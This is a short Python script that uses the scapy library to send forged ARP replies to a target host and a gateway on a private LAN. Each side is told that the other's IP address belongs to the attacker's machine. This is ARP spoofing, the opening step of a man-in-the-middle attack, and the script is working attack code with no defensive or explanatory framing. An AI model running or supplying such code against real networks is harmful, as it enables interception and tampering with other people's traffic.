import scapy.all as scapy




target_ip="192.168.62.143"
target_mac="c0-b8-83-f3-b6-eb"
gateway_ip="192.168.62.99"
gateway_mac="f2-fb-5b-44-b9-bf"
packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=gateway_ip)
scapy.send(packet, count=2, verbose=False)
packet = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=target_ip)
scapy.send(packet, count=2, verbose=False)


